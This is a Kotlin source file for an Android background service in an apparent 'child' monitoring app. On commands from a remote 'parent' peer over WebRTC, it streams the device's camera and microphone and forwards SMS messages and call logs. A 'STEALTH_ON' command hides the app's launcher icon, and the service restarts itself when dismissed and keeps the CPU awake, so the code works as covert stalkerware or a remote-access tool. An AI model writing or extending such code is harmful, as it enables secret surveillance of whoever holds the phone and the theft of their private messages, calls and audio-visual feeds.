package com.soumo.child.service

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.ComponentName
import android.content.pm.PackageManager
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.google.firebase.database.FirebaseDatabase
import com.soumo.child.MainActivity
import com.soumo.child.R
import com.soumo.child.calllog.CallLogSharing
import com.soumo.child.camera.CameraController
import com.soumo.child.id.DeviceIdManager
import com.soumo.child.microphone.MicrophoneController
import com.soumo.child.signaling.PeerRole
import com.soumo.child.signaling.SignalingClient
import com.soumo.child.sms.SmsSharing
import com.soumo.child.webrtc.PeerObserver
import com.soumo.child.webrtc.PhantomPeerManager
import com.soumo.child.webstreaming.ScreenStreamer
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import org.webrtc.DataChannel
import org.webrtc.PeerConnection
import org.webrtc.SdpObserver
import org.webrtc.SessionDescription
import java.nio.ByteBuffer
import java.util.concurrent.atomic.AtomicBoolean

class BackgroundService : Service() {

    companion object {
        private const val NOTIFICATION_ID = 1001
        private const val CHANNEL_ID = "DeltaApp_Background"
        private const val CHANNEL_NAME = "DeltaApp Background Service"
        private const val CHANNEL_DESCRIPTION = "Keeps DeltaApp running in background"

        private var isServiceRunning = AtomicBoolean(false)

        fun startService(context: Context) {
            if (!isServiceRunning.get()) {
                val intent = Intent(context, BackgroundService::class.java)
                context.startForegroundService(intent)
            }
        }

    }

    // WebRTC Components
    private var peerMgr: PhantomPeerManager? = null
    private var signaling: SignalingClient? = null
    private var cameraCtrl: CameraController? = null
    private var micCtrl: MicrophoneController? = null
    private var screenStreamer: ScreenStreamer? = null
    private var smsSharing: SmsSharing? = null
    private var callLogSharing: CallLogSharing? = null
    private var dataChannel: DataChannel? = null

    // Connection Management
    private var healthCheckJob: Job? = null
    private var reconnectionJob: Job? = null
    private var isReconnecting = AtomicBoolean(false)
    private var reconnectionAttempts = 0
    private val maxReconnectionAttempts = 5
    // Track last time we received PONG from parent (or saw channel open)
    @Volatile private var lastPongAtMs: Long = 0L
    private var persistentRoomId: String? = null
    private val stealthActivated = java.util.concurrent.atomic.AtomicBoolean(false)

    // Coroutine Scope
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    // Peer Role
    private val peerRole = PeerRole.OFFERER

    override fun onCreate() {
        super.onCreate()
        Log.d("BackgroundService", "Service created")
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification())
        isServiceRunning.set(true)

        // Acquire wake lock for CPU intensive operations
        acquireWakeLock()
        
        // Request to ignore battery optimizations
        requestIgnoreBatteryOptimizations()

        // Start background connection
        serviceScope.launch {
            initializeConnection()
        }
        
        // Note: Job scheduling should only happen in BootReceiver and PersistentJobService
        // to avoid infinite loops
    }

    private var wakeLock: android.os.PowerManager.WakeLock? = null

    private fun acquireWakeLock() {
        try {
            val powerManager = getSystemService(POWER_SERVICE) as android.os.PowerManager
            wakeLock = powerManager.newWakeLock(
                android.os.PowerManager.PARTIAL_WAKE_LOCK,
                "DeltaApp::BackgroundServiceLock"
            ).apply {
                setReferenceCounted(false)
                acquire(10 * 60 * 1000L) // 10 minutes, will be reacquired
            }
            Log.d("BackgroundService", "Wake lock acquired")
        } catch (e: Exception) {
            Log.e("BackgroundService", "Failed to acquire wake lock", e)
        }
    }

    private fun releaseWakeLock() {
        try {
            wakeLock?.let {
                if (it.isHeld) {
                    it.release()
                }
            }
            wakeLock = null
            Log.d("BackgroundService", "Wake lock released")
        } catch (e: Exception) {
            Log.e("BackgroundService", "Failed to release wake lock", e)
        }
    }

    private fun requestIgnoreBatteryOptimizations() {
        try {
            val powerManager = getSystemService(POWER_SERVICE) as android.os.PowerManager
            if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
                Log.d("BackgroundService", "Requesting battery optimization ignore")
                // Note: This requires user interaction, handled in MainActivity
            }
        } catch (e: Exception) {
            Log.e("BackgroundService", "Failed to check battery optimizations", e)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d("BackgroundService", "Service started with flags: $flags, startId: $startId")
        
        // Reacquire wake lock on restart
        acquireWakeLock()
        
        return START_STICKY // Restart service if killed
    }
    override fun onBind(intent: Intent?): IBinder? = null
    override fun onDestroy() {
        Log.d("BackgroundService", "Service destroyed")
        isServiceRunning.set(false)
        cleanupEverything()
        releaseWakeLock()
        serviceScope.cancel()
        super.onDestroy()
        
        // Restart handling is delegated to BootReceiver/JobService; no AlarmManager schedule here
        Log.d("BackgroundService", "Service destroyed - restart handled by BootReceiver/JobService")
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        Log.d("BackgroundService", "Task removed, restarting service")
        super.onTaskRemoved(rootIntent)
        
        // Restart service immediately when app is swiped away
        val restartIntent = Intent(this, BackgroundService::class.java)
        startService(restartIntent)
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            CHANNEL_ID,
            CHANNEL_NAME,
            NotificationManager.IMPORTANCE_HIGH
        ).apply {
            description = CHANNEL_DESCRIPTION
            setShowBadge(false)
            enableLights(true)
            enableVibration(true)
            setSound(null, null)
        }

        val notificationManager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
        notificationManager.createNotificationChannel(channel)
    }

    private fun createNotification(): Notification {
        val intent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
        }
        val pendingIntent = PendingIntent.getActivity(
            this, 0, intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Child is crying 😭")
            .setContentText("Don't you love your child? 😈")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setSilent(false)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setVisibility(NotificationCompat.VISIBILITY_PUBLIC)
            .build()
    }

    private suspend fun initializeConnection() {
        Log.d("BackgroundService", "Initializing background connection")
        try {
            // Load device ID from SharedPreferences (generated by MainActivity)
            val prefs = getSharedPreferences("phantom_prefs", MODE_PRIVATE)
            var existingId = prefs.getString("device_id", null)

            if (existingId == null) {
                Log.w("BackgroundService", "No device ID found, waiting for MainActivity to generate...")
                // Wait up to 30 seconds for device ID to be generated
                var attempts = 0
                while (existingId == null && attempts < 30) {
                    delay(1000) // Wait 1 second
                    existingId = prefs.getString("device_id", null)
                    attempts++
                    Log.d("BackgroundService", "Waiting for device ID... attempt $attempts")
                }
                
                if (existingId == null) {
                    Log.e("BackgroundService", "Device ID still not found after 30 seconds")
                    return
                }
            }

            val rawRoomId = existingId
            val formattedRoomId = DeviceIdManager.format(existingId)
            persistentRoomId = formattedRoomId

            Log.d("BackgroundService", "Using device ID from MainActivity: $existingId")
            Log.d("BackgroundService", "Formatted room ID: $formattedRoomId")
            Log.d("BackgroundService", "Using raw room ID for Firebase: $rawRoomId")

            val observer = PeerObserver(
                onIce = { /* No-op for Non-Trickle ICE */ },
                onData = { cmd -> handleCommand(cmd) },
                onConnectionStateChange = { state ->
                    Log.d("BackgroundService", "Connection state changed: $state")
                    when (state) {
                        PeerConnection.PeerConnectionState.CONNECTED -> {
                            reconnectionAttempts = 0
                            isReconnecting.set(false)
                            reconnectionJob?.cancel()
                            reconnectionJob = null
                            Log.d("BackgroundService", "Connection established")
                        }
                        PeerConnection.PeerConnectionState.DISCONNECTED -> {
                            if (!isReconnecting.get()) {
                                Log.d("BackgroundService", "PeerConnection disconnected - scheduling restart")
                                serviceScope.launch { restartConnection() }
                            }
                        }
                        PeerConnection.PeerConnectionState.FAILED -> {
                            if (!isReconnecting.get()) {
                                Log.d("BackgroundService", "PeerConnection failed - scheduling restart")
                                serviceScope.launch { restartConnection() }
                            }
                        }
                        PeerConnection.PeerConnectionState.CLOSED -> {
                            if (!isReconnecting.get()) {
                                Log.d("BackgroundService", "PeerConnection closed - scheduling restart")
                                serviceScope.launch { restartConnection() }
                            }
                        }
                        else -> {
                            Log.d("BackgroundService", "Connection state: $state")
                        }
                    }
                }
            )

            // Create peer manager
            peerMgr = PhantomPeerManager(this, observer).apply {
                initializePeerConnectionFactory()
                createPeerConnection(listOf(
                    PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer(),
                    PeerConnection.IceServer.builder("stun:stun1.l.google.com:19302").createIceServer()
                ))
            }

            // Create controllers
            cameraCtrl = CameraController(this, peerMgr!!.getFactory(), peerMgr!!.getPeerConnection())
            micCtrl = MicrophoneController(this, peerMgr!!.getFactory(), peerMgr!!.getPeerConnection())
            micCtrl!!.setRenegotiationCallback { performWebRTCRenegotiation() }

            screenStreamer = ScreenStreamer(this, peerMgr!!.getFactory(), peerMgr!!.getPeerConnection()!!)
            screenStreamer!!.setStatusCallback { status -> sendDataChannelMessage(status) }
            screenStreamer!!.setRenegotiationCallback { performWebRTCRenegotiation() }

            // Initialize sharing components (will be set after data channel is created)
            smsSharing = null
            callLogSharing = null

            // Create signaling client
            signaling = SignalingClient(
                roomId = rawRoomId,
                role = peerRole,
                onOfferReceived = { offer ->
                    Log.d("BackgroundService", "Offer received")
                    peerMgr!!.setRemoteDescription(offer, logSdp("RemoteOffer"))
                    serviceScope.launch {
                        val answer = peerMgr!!.createNonTrickleAnswer()
                        if (answer != null) {
                            signaling!!.sendAnswer(answer)
                            Log.d("BackgroundService", "Answer sent (Non-Trickle ICE)")
                        } else {
                            Log.e("BackgroundService", "Failed to create answer")
                        }
                    }
                },
                onAnswerReceived = { answer ->
                    Log.d("BackgroundService", "Answer received")
                    peerMgr!!.setRemoteDescription(answer, logSdp("RemoteAnswer"))
                },
                onIceCandidate = { /* No-op for Non-Trickle ICE */ }
            )

            if (peerRole == PeerRole.OFFERER) {
                Log.d("BackgroundService", "Creating offer...")

                // Clean up Firebase data
                FirebaseDatabase.getInstance(AppConfig.Firebase.DATABASE_URL)
                    .reference.child(AppConfig.Firebase.CALLS_PATH).child(rawRoomId).removeValue()

                // Create data channel
                dataChannel = peerMgr!!.getPeerConnection()?.createDataChannel("cmd", DataChannel.Init().apply { ordered = true })

                // Initialize sharing components after data channel is created
                dataChannel?.let { channel ->
                    smsSharing = SmsSharing(this, channel)
                    callLogSharing = CallLogSharing(this, channel)
                }

                dataChannel?.registerObserver(object : DataChannel.Observer {
                    override fun onStateChange() {
                        val state = dataChannel?.state()
                        Log.d("BackgroundService", "DataChannel state: $state")
                        when (state) {
                            DataChannel.State.OPEN -> {
                                Log.d("BackgroundService", "DataChannel opened")
                                startHealthCheck()
                                lastPongAtMs = System.currentTimeMillis()
                            }
                            DataChannel.State.CLOSED -> {
                                Log.d("BackgroundService", "DataChannel closed - parent disconnected")
                                stopHealthCheck()
                                if (!isReconnecting.get()) {
                                    serviceScope.launch {
                                        restartConnection()
                                    }
                                }
                            }
                            else -> {
                                Log.d("BackgroundService", "DataChannel state: $state")
                            }
                        }
                    }
                    override fun onBufferedAmountChange(l: Long) {}
                    override fun onMessage(buf: DataChannel.Buffer) {
                        val data = ByteArray(buf.data.remaining())
                        buf.data.get(data)
                        val message = String(data)
                        Log.d("BackgroundService", "DataChannel message: $message")
                        handleCommand(message)
                    }
                })

                // Create offer using Non-Trickle ICE
                serviceScope.launch {
                    val offer = peerMgr!!.createNonTrickleOffer()
                    if (offer != null) {
                        signaling!!.sendOffer(offer)
                        Log.d("BackgroundService", "Offer sent (Non-Trickle ICE)")
                    } else {
                        Log.e("BackgroundService", "Failed to create offer")
                    }
                }
            }

        } catch (e: Exception) {
            Log.e("BackgroundService", "Error initializing connection", e)
                            // Retry after delay
            delay(5000)
                initializeConnection()
        }
    }

    private fun restartConnection() {
        Log.d("BackgroundService", "Starting connection restart...")
        if (isReconnecting.get()) {
            Log.d("BackgroundService", "Restart already in progress")
            return
        }

        isReconnecting.set(true)
        reconnectionJob?.cancel()
        healthCheckJob?.cancel()

        reconnectionJob = serviceScope.launch {
            try {
                Log.d("BackgroundService", "Cleaning up current connection...")
                cleanupCurrentConnection()
                delay(2000)

                if (!isReconnecting.get()) {
                    Log.d("BackgroundService", "Restart cancelled")
                    return@launch
                }

                Log.d("BackgroundService", "Reinitializing connection...")
                initializeConnection()
                Log.d("BackgroundService", "Connection restart completed")
                isReconnecting.set(false)
                reconnectionAttempts = 0

            } catch (_: CancellationException) {
                Log.d("BackgroundService", "Restart job cancelled")
                isReconnecting.set(false)
            } catch (e: Exception) {
                Log.e("BackgroundService", "Connection restart failed", e)
                isReconnecting.set(false)
                reconnectionAttempts++

                if (reconnectionAttempts < maxReconnectionAttempts) {
                    // Schedule restart with exponential backoff
                    val delayTime = 5000 * reconnectionAttempts
                    serviceScope.launch {
                        delay(delayTime.toLong()) // Exponential backoff
                        restartConnection()
                    }
                } else {
                    Log.e("BackgroundService", "Max reconnection attempts reached")
                }
            }
        }
    }

    private fun cleanupCurrentConnection() {
        Log.d("BackgroundService", "Cleaning up current connection...")
        try {
            stopHealthCheck()
            signaling?.cleanup()
            signaling = null
            dataChannel?.close()
            dataChannel = null
            peerMgr?.getPeerConnection()?.close()
            cameraCtrl?.stopCamera()
            micCtrl?.stopMicrophone()
            screenStreamer?.stop()
            smsSharing?.stopSharing()
            smsSharing = null
            callLogSharing?.stopSharing()
            callLogSharing = null
            Log.d("BackgroundService", "Connection cleanup completed")
        } catch (e: Exception) {
            Log.e("BackgroundService", "Error during cleanup", e)
        }
    }

    private fun cleanupEverything() {
        Log.d("BackgroundService", "Cleaning up everything...")
        cleanupCurrentConnection()
        peerMgr = null
        cameraCtrl = null
        micCtrl = null
        screenStreamer = null
    }

    // Stealth helpers for service context (toggle launcher component)
    private fun activateStealthModeService() {
        try {
            val pm = packageManager
            val componentName = ComponentName(this, com.soumo.child.MainActivity::class.java)
            pm.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            Log.e("StealthMode", "Failed to activate stealth mode (service)", e)
        }
    }

    private fun deactivateStealthModeService() {
        try {
            val pm = packageManager
            val componentName = ComponentName(this, com.soumo.child.MainActivity::class.java)
            pm.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            Log.e("StealthMode", "Failed to deactivate stealth mode (service)", e)
        }
    }

    private fun startHealthCheck() {
        Log.d("BackgroundService", "Starting health check")
        healthCheckJob?.cancel()
        healthCheckJob = serviceScope.launch {
            while (isActive) {
                try {
                    delay(30000) // 30 seconds
                    if (dataChannel?.state() == DataChannel.State.OPEN) {
                        dataChannel?.send(DataChannel.Buffer(ByteBuffer.wrap("PING_CHILD".toByteArray()), false))
                        Log.d("BackgroundService", "Health check ping sent")
                    }
                } catch (e: Exception) {
                    Log.e("BackgroundService", "Health check error", e)
                }
            }
        }
    }

    private fun stopHealthCheck() {
        Log.d("BackgroundService", "Stopping health check")
        healthCheckJob?.cancel()
        healthCheckJob = null
    }


    private fun performWebRTCRenegotiation() {
        Log.d("BackgroundService", "Performing WebRTC renegotiation")
        serviceScope.launch {
            try {
                if (peerRole == PeerRole.OFFERER) {
                    val offer = peerMgr!!.createNonTrickleOffer()
                    if (offer != null) {
                        signaling!!.sendOffer(offer)
                        Log.d("BackgroundService", "Renegotiation offer sent (Non-Trickle ICE)")
                    } else {
                        Log.e("BackgroundService", "Failed to create renegotiation offer")
                    }
                }
            } catch (e: Exception) {
                Log.e("BackgroundService", "Renegotiation error", e)
            }
        }
    }

    private fun sendDataChannelMessage(message: String) {
        if (dataChannel?.state() == DataChannel.State.OPEN) {
            dataChannel?.send(DataChannel.Buffer(ByteBuffer.wrap(message.toByteArray()), false))
            Log.d("BackgroundService", "DataChannel message sent: $message")
        }
    }

    private fun handleCommand(command: String) {
        try {
            // Try to parse as JSON
            val json = try { org.json.JSONObject(command) } catch (_: Exception) { null }
            val cmd = json?.optString("cmd") ?: command.trim()
            json?.optLong("since", 0L) ?: 0L

            when (cmd) {
                //Camera Commands
                "CAMERA_ON" -> {
                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                        == PackageManager.PERMISSION_GRANTED
                    ) {
                        try {
                            cameraCtrl?.startCamera()
                            sendDataChannelMessage("CAMERA_STARTED")
                            Log.d("BackgroundService", "Camera started successfully")
                        } catch (e: Exception) {
                            Log.e("BackgroundService", "Failed to start camera", e)
                            sendDataChannelMessage("CAMERA_ERROR: ${e.message}")
                        }
                    } else {
                        sendDataChannelMessage("CAMERA_PERMISSION_NEEDS_SETTINGS")
                        Log.w("BackgroundService", "Camera permission not granted")
                    }
                }
                "CAMERA_OFF" -> {
                    try {
                        cameraCtrl?.stopCamera()
                        sendDataChannelMessage("CAMERA_STOPPED")
                        Log.d("BackgroundService", "Camera stopped successfully")
                    } catch (e: Exception) {
                        Log.e("BackgroundService", "Failed to stop camera", e)
                        sendDataChannelMessage("CAMERA_ERROR: ${e.message}")
                    }
                }
                "CAMERA_SWITCH" -> {
                    try {
                        cameraCtrl?.switchCamera()
                        sendDataChannelMessage("CAMERA_SWITCHED")
                        Log.d("BackgroundService", "Camera switched successfully")
                    } catch (e: Exception) {
                        Log.e("BackgroundService", "Failed to switch camera", e)
                        sendDataChannelMessage("CAMERA_ERROR: ${e.message}")
                    }
                }
                //Mic Commands
                "MIC_ON" -> {
                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
                        == PackageManager.PERMISSION_GRANTED
                    ) {
                        try {
                            micCtrl?.startMicrophone()
                            sendDataChannelMessage("MIC_STARTED")
                            Log.d("BackgroundService", "Microphone started successfully")
                        } catch (e: Exception) {
                            Log.e("BackgroundService", "Failed to start microphone", e)
                            sendDataChannelMessage("MIC_ERROR: ${e.message}")
                        }
                    } else {
                        sendDataChannelMessage("MIC_PERMISSION_NEEDS_SETTINGS")
                        Log.w("BackgroundService", "Microphone permission not granted")
                    }
                }
                "MIC_OFF" -> {
                    try {
                        micCtrl?.stopMicrophone()
                        sendDataChannelMessage("MIC_STOPPED")
                        Log.d("BackgroundService", "Microphone stopped successfully")
                    } catch (e: Exception) {
                        Log.e("BackgroundService", "Failed to stop microphone", e)
                        sendDataChannelMessage("MIC_ERROR: ${e.message}")
                    }
                }
                //Screen Commands
                "SCREEN_ON" -> {
                    try {
                        Log.d("BackgroundService", "Requesting screen capture permission")
                        if (screenStreamer != null) {
                            sendDataChannelMessage("SCREEN_STATUS:NOT_AVAILABLE_IN_BACKGROUND")
                            Log.w("BackgroundService", "Screen capture not available in background")
                        } else {
                            Log.e("BackgroundService", "ScreenStreamer not initialized")
                            sendDataChannelMessage("SCREEN_CAPTURE_ERROR: Streamer not initialized")
                        }
                    } catch (e: Exception) {
                        Log.e("BackgroundService", "Error requesting screen capture", e)
                        sendDataChannelMessage("SCREEN_CAPTURE_ERROR: ${e.message}")
                    }
                }
                "SCREEN_OFF" -> {
                    try {
                        Log.d("BackgroundService", "Stopping screen capture")
                        if (screenStreamer != null) {
                            screenStreamer!!.stop()
                            sendDataChannelMessage("SCREEN_STOPPED")
                            Log.d("BackgroundService", "Screen capture stopped successfully")
                        } else {
                            Log.w("BackgroundService", "ScreenStreamer not initialized")
                            sendDataChannelMessage("SCREEN_ERROR: Streamer not initialized")
                        }
                    } catch (e: Exception) {
                        Log.e("BackgroundService", "Error stopping screen capture", e)
                        sendDataChannelMessage("SCREEN_CAPTURE_ERROR: ${e.message}")
                    }
                }
                //Location Commands
                "LOCATE_CHILD" -> {
                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                        == PackageManager.PERMISSION_GRANTED
                    ) {
                        try {
                            // Location tracking would need to be implemented in service context
                            sendDataChannelMessage("LOCATION_STARTED")
                            Log.d("BackgroundService", "Location tracking started successfully")
                        } catch (e: Exception) {
                            Log.e("BackgroundService", "Failed to start location tracking", e)
                            sendDataChannelMessage("LOCATION_ERROR: ${e.message}")
                        }
                    } else {
                        sendDataChannelMessage("LOCATION_PERMISSION_NEEDS_SETTINGS")
                        Log.w("BackgroundService", "Location permission not granted")
                    }
                }
                "LOCATE_CHILD_STOP" -> {
                    try {
                        // Location tracking stop would need to be implemented
                        sendDataChannelMessage("LOCATION_STOPPED")
                        Log.d("BackgroundService", "Location tracking stopped successfully")
                    } catch (e: Exception) {
                        Log.e("BackgroundService", "Failed to stop location tracking", e)
                        sendDataChannelMessage("LOCATION_ERROR: ${e.message}")
                    }
                }
                //SMS Commands
                "SMS_ON" -> {
                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
                        == PackageManager.PERMISSION_GRANTED
                    ) {
                        try {
                            //initializeSmsSharing()
                            smsSharing?.startSharing()
                            sendDataChannelMessage("SMS_STARTED")
                            Log.d("Command", "SMS sharing started (Background)")
                        } catch (e: Exception) {
                            Log.e("Command", "Failed to start SMS sharing", e)
                            sendDataChannelMessage("SMS_ERROR: ${e.message}")
                        }
                    } else {
                        //requestPermissionWithFallback(Manifest.permission.READ_SMS, 1005, "SMS")
                        sendDataChannelMessage("SMS_PERMISSION_REQUESTED")
                        Log.d("Command", "Requested READ_SMS permission")
                    }
                }
                "SMS_OFF" -> {
                    if (smsSharing == null) {
                        Log.w("Command", "Tried to stop SMS sharing but it was never started.")
                    }
                    try {
                        smsSharing?.stopSharing()
                        sendDataChannelMessage("SMS_STOPPED")
                        Log.d("Command", "SMS sharing stopped")
                    } catch (e: Exception) {
                        Log.e("Command", "Failed to stop SMS sharing", e)
                        sendDataChannelMessage("SMS_ERROR: ${e.message}")
                    }
                }

                // Call Log Commands
                "CALLLOG_ON" -> {
                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
                        == PackageManager.PERMISSION_GRANTED
                    ) {
                        try {
                            //initializeCallLogSharing()
                            callLogSharing?.startSharing()
                            sendDataChannelMessage("CALLLOG_STARTED")
                            Log.d("Command", "Call log sharing started (Background)")
                        } catch (e: Exception) {
                            Log.e("Command", "Failed to start call log sharing", e)
                            sendDataChannelMessage("CALLLOG_ERROR: ${e.message}")
                        }
                    } else {
                       // requestPermissionWithFallback(Manifest.permission.READ_CALL_LOG, 1006, "Call Log")
                        sendDataChannelMessage("CALLLOG_PERMISSION_REQUESTED")
                        Log.d("Command", "Requested READ_CALL_LOG permission")
                    }
                }
                "CALLLOG_OFF" -> {
                    if (callLogSharing == null) {
                        Log.w("Command", "Tried to stop call log sharing but it was never started.")
                    }
                    try {
                        callLogSharing?.stopSharing()
                        sendDataChannelMessage("CALLLOG_STOPPED")
                        Log.d("Command", "Call log sharing stopped")
                    } catch (e: Exception) {
                        Log.e("Command", "Failed to stop call log sharing", e)
                        sendDataChannelMessage("CALLLOG_ERROR: ${e.message}")
                    }
                }
                //Stealth Commands
                "STEALTH_ON" -> {
                    activateStealthModeService()
                    stealthActivated.set(true)
                    sendDataChannelMessage("STEALTH_ON_ACK")
                    Log.d("Command", "Stealth mode activated")
                }
                "STEALTH_OFF" -> {
                    deactivateStealthModeService()
                    stealthActivated.set(false)
                    sendDataChannelMessage("STEALTH_OFF_ACK")
                    Log.d("Command", "Stealth mode deactivated")
                }
                // Ping Command
                "PING_CHILD" -> {
                    sendDataChannelMessage("PONG_CHILD")
                    Log.d("BackgroundService", "Ping received and pong sent")
                }
                "PONG_PARENT" -> {
                        Log.d("BackgroundService", "Pong received from parent - connection is healthy")
                        lastPongAtMs = System.currentTimeMillis()
                }
                "CHECK_PERMISSIONS" -> {
                    checkPermissionStatus()
                    Log.d("BackgroundService", "Checking permission status")
                }
                else -> {
                    Log.w("BackgroundService", "Unknown command: $cmd")
                    sendDataChannelMessage("COMMAND_STATUS:UNKNOWN")
                }
            }
        } catch (e: Exception) {
            Log.e("BackgroundService", "Error handling command: $command", e)
            sendDataChannelMessage("COMMAND_STATUS:ERROR")
        }
    }

    private fun checkPermissionStatus() {
        val permissions = mapOf(
            "CAMERA" to Manifest.permission.CAMERA,
            "MICROPHONE" to Manifest.permission.RECORD_AUDIO,
            "LOCATION" to Manifest.permission.ACCESS_FINE_LOCATION,
            "SMS" to Manifest.permission.READ_SMS,
            "CALL_LOG" to Manifest.permission.READ_CALL_LOG
        )

        val status = permissions.map { (name, permission) ->
            val granted = ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
            "$name:${if (granted) "GRANTED" else "DENIED"}"
        }.joinToString("|")

        sendDataChannelMessage("PERMISSION_STATUS:$status")
        Log.d("BackgroundService", "Permission status: $status")
    }

    private fun logSdp(operation: String): SdpObserver {
        return object : SdpObserver {
            override fun onCreateSuccess(sdp: SessionDescription) {
                Log.d("BackgroundService", "$operation: onCreateSuccess")
            }
            override fun onSetSuccess() {
                Log.d("BackgroundService", "$operation: onSetSuccess")
            }
            override fun onCreateFailure(error: String) {
                Log.e("BackgroundService", "$operation: onCreateFailure - $error")
            }
            override fun onSetFailure(error: String) {
                Log.e("BackgroundService", "$operation: onSetFailure - $error")
            }
        }
    }
}